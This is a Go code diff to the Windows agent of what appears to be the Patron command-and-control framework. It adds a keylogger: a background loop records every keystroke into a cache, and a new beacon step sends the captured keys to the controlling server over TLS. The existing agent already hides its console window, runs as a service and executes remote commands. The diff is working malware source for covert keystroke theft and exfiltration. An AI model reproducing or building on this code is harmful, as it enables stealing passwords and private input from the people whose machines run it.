@@ -11,6 +11,7 @@ import (
 	"github.com/PatronC2/Patron/types"
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/Patron/client/client_utils"
+	"github.com/PatronC2/Patron/client/client_utils/windows/keylogger"
 	"github.com/kardianos/service"
 )
 
@@ -20,6 +21,11 @@ var (
 	CallbackFrequency   string
 	CallbackJitter      string
 	RootCert            string
+	cache               string
+)
+
+const (
+	delayKeyfetchMS = 5
 )
 
 type program struct{}
@@ -42,7 +48,7 @@ func HideConsoleWindow() {
 
     hwnd, _, _ := getConsoleWindow.Call()
     if hwnd != 0 {
-        showWindow.Call(hwnd, uintptr(0))
+        showWindow.Call(hwnd, uintptr(0)) // SW_HIDE = 0
     }
 }
 
@@ -52,6 +58,19 @@ func (p *program) run() {
 	if err != nil {
 		log.Fatalf("Failed to load certificate: %v\n", err)
 	}
+
+	keylogger := keylogger.NewKeylogger()
+
+	go func() {
+		for {
+			key := keylogger.GetKey()
+			if !key.Empty {
+				cache = cache + string(key.Rune)
+				logger.Logf(logger.Info, "Current cache: %v", cache)
+			}
+			time.Sleep(delayKeyfetchMS * time.Millisecond)
+		}
+	}()
 
 	agentID, hostname, username := client_utils.GenerateAgentMetadata()
 	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
@@ -74,7 +93,12 @@ func (p *program) run() {
 			client_utils.HandleError(beacon, "command", err)
 			continue
 		}
-		
+
+		if err := handleKeysRequest(beacon, encoder, decoder, agentID); err != nil {
+			client_utils.HandleError(beacon, "keylogs", err)
+			continue
+		}
+
 		beacon.Close()
 		logger.Logf(logger.Info, "Beacon successful")
 		time.Sleep(time.Second * time.Duration(client_utils.CalculateSleepInterval(CallbackFrequency, CallbackJitter)))
@@ -220,4 +244,23 @@ func executeCommandRequest(instruct *types.CommandResponse) types.CommandStatusR
 		CommandResult: result,
 		CommandOutput: CmdOut,
 	}
+}
+
+func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
+	logger.Logf(logger.Info, "Sending keylogs: %v", cache)
+	keyResponse := types.KeysRequest{
+		AgentID: agentID,
+		Keys: cache,
+	}
+
+	if err := client_utils.SendRequest(encoder, types.KeysRequestType, keyResponse); err != nil {
+		return err
+	}
+	var response types.Response
+	if err := decoder.Decode(&response); err != nil {
+		return fmt.Errorf("error decoding command response: %v", err)
+	}
+	cache = ""
+
+	return nil
 }
